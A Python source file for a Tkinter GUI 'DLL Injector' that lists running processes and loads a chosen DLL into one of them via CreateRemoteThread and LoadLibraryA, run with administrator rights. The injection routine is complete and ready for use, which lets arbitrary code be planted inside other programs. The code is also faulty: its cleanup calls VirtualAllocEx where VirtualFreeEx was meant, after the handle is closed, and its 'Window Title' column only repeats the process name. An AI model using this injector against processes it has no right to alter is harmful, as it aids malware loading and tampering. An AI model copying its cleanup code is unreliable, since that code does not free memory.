import ctypes
import os
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import psutil
from tkinter.scrolledtext import ScrolledText
import webbrowser
import threading
from datetime import datetime

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_READWRITE = 0x04

# Load Windows API functions
kernel32 = ctypes.windll.kernel32

# Define required Windows API structures and functions
OpenProcess = kernel32.OpenProcess
VirtualAllocEx = kernel32.VirtualAllocEx
WriteProcessMemory = kernel32.WriteProcessMemory
GetProcAddress = kernel32.GetProcAddress
GetModuleHandle = kernel32.GetModuleHandleW
CreateRemoteThread = kernel32.CreateRemoteThread
WaitForSingleObject = kernel32.WaitForSingleObject
CloseHandle = kernel32.CloseHandle


# Function to check if the program is running as administrator
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


# Function to inject DLL into a target process
def inject_dll(process_id, dll_path):
    try:
        # Open the target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if not process_handle:
            raise ctypes.WinError()

        # Allocate memory in the target process for the DLL path
        dll_path_length = len(dll_path) + 1
        remote_memory = VirtualAllocEx(
            process_handle, None, dll_path_length, MEM_COMMIT, PAGE_READWRITE
        )
        if not remote_memory:
            raise ctypes.WinError()

        # Write the DLL path into the allocated memory
        WriteProcessMemory(
            process_handle,
            remote_memory,
            dll_path.encode("utf-8"),
            dll_path_length,
            None,
        )

        # Get the address of LoadLibraryA in kernel32.dll
        kernel32_handle = GetModuleHandle("kernel32.dll")
        load_library_address = GetProcAddress(kernel32_handle, "LoadLibraryA")

        # Create a remote thread in the target process to load the DLL
        remote_thread = CreateRemoteThread(
            process_handle, None, 0, load_library_address, remote_memory, 0, None
        )
        if not remote_thread:
            raise ctypes.WinError()

        # Wait for the remote thread to finish
        WaitForSingleObject(remote_thread, -1)

        # Clean up
        CloseHandle(remote_thread)
        CloseHandle(process_handle)
        VirtualAllocEx(
            process_handle, remote_memory, 0, MEM_COMMIT, PAGE_READWRITE
        )  # Free memory

        return True, f"DLL injected process ID {process_id}!"
    except Exception as e:
        return False, f"Failed to inject DLL: {e}"


# Function to get a list of running processes
def get_process_list():
    process_list = []
    for proc in psutil.process_iter(["pid", "name"]):
        try:
            process_name = proc.info["name"]
            process_id = proc.info["pid"]
            process_title = proc.name()  # Get the window title (if available)
            process_list.append((process_name, process_title, process_id))
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return process_list


# GUI Application
class DLLInjectorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("DLL Injector")
        self.root.geometry("500x420")  # Set window size
        self.root.resizable(False, False)  # Disable resizing

        # Check for admin privileges
        if not is_admin():
            messagebox.showerror("Error", "This program must be run as administrator!")
            self.root.destroy()
            return

        # GitHub Button
        self.github_button = ttk.Button(
            root, text="GitHub", command=self.open_github, width=3
        )
        self.github_button.place(x=420, y=220, width=70, height=30)

        # Process List Frame
        self.process_frame = ttk.LabelFrame(root, text="Running Processes")
        self.process_frame.place(x=10, y=10, width=480, height=200)

        # Search Label
        self.search_label = ttk.Label(self.process_frame, text="Search")
        self.search_label.place(x=10, y=10)

        # Process Search Bar
        self.search_var = tk.StringVar()
        self.search_entry = ttk.Entry(
            self.process_frame, textvariable=self.search_var, width=40
        )
        self.search_entry.place(x=50, y=10)
        self.search_entry.bind("<KeyRelease>", self.filter_process_list)

        # Process List Treeview with Scrollbar
        self.tree_scroll = ttk.Scrollbar(self.process_frame)
        self.tree_scroll.place(x=460, y=40, height=140)

        self.process_tree = ttk.Treeview(
            self.process_frame,
            columns=("Name", "Title", "PID"),
            show="headings",
            yscrollcommand=self.tree_scroll.set,
        )
        self.process_tree.heading("Name", text="Process Name")
        self.process_tree.heading("Title", text="Window Title")
        self.process_tree.heading("PID", text="Process ID")
        self.process_tree.column("Name", width=150)
        self.process_tree.column("Title", width=150)
        self.process_tree.column("PID", width=80)
        self.process_tree.place(x=10, y=40, width=450, height=160)

        self.tree_scroll.config(command=self.process_tree.yview)

        # Refresh Button
        self.refresh_button = ttk.Button(
            self.process_frame, text="Refresh", command=self.refresh_process_list
        )
        self.refresh_button.place(x=380, y=10)

        # Inject Button
        self.inject_button = ttk.Button(
            root, text="Inject DLL", command=self.start_injection_thread
        )
        self.inject_button.place(x=215, y=220, width=200, height=30)

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set(" Waiting for file selection...")
        self.status_bar = ttk.Label(
            root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W
        )
        self.status_bar.place(x=10, y=260, width=480)

        # Browse Button
        self.browse_button = ttk.Button(
            root, text="Select DLL", command=self.browse_dll
        )
        self.browse_button.place(x=10, y=220, width=200, height=30)

        # Logging Area
        self.log_area = ScrolledText(root, height=6, state="disabled")
        self.log_area.place(x=10, y=290, width=480)

        # Populate the process list
        self.refresh_process_list()

    # Function to open GitHub page
    def open_github(self):
        webbrowser.open("https://github.com/good-wizard")

    # Function to refresh the process list
    def refresh_process_list(self):
        for row in self.process_tree.get_children():
            self.process_tree.delete(row)
        for process in get_process_list():
            self.process_tree.insert("", tk.END, values=process)

    # Function to filter the process list
    def filter_process_list(self, event=None):
        search_term = self.search_var.get().lower()
        for row in self.process_tree.get_children():
            self.process_tree.delete(row)
        for process in get_process_list():
            if (
                search_term in process[0].lower()
                or search_term in str(process[2]).lower()
            ):
                self.process_tree.insert("", tk.END, values=process)

    # Function to browse for a DLL file
    def browse_dll(self):
        dll_path = filedialog.askopenfilename(filetypes=[("DLL Files", "*.dll")])
        if dll_path:
            self.dll_path = dll_path
            self.status_var.set(" DLL file selected. Ready to inject.")

    # Function to handle the injection process in a separate thread
    def start_injection_thread(self):
        threading.Thread(target=self.inject, daemon=True).start()

    # Function to handle the injection process
    def inject(self):
        selected_item = self.process_tree.selection()
        if not selected_item:
            self.log("Error: Please select a process from the list!", "error")
            return

        if not hasattr(self, "dll_path") or not os.path.isfile(self.dll_path):
            self.log("Error: No DLL file selected!", "error")
            return

        process_id = self.process_tree.item(selected_item, "values")[2]
        self.status_var.set(" Injecting DLL...")
        success, message = inject_dll(int(process_id), self.dll_path)
        self.status_var.set(" Injection complete. Ready for next action.")
        self.log(message, "success" if success else "error")

    # Function to log messages with timestamps and error levels
    def log(self, message, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] [{level.upper()}] {message}\n"
        self.log_area.config(state="normal")
        self.log_area.insert(tk.END, log_message)
        self.log_area.config(state="disabled")
        self.log_area.yview(tk.END)


# Run the application
if __name__ == "__main__":
    root = tk.Tk()
    app = DLLInjectorApp(root)
    root.mainloop()
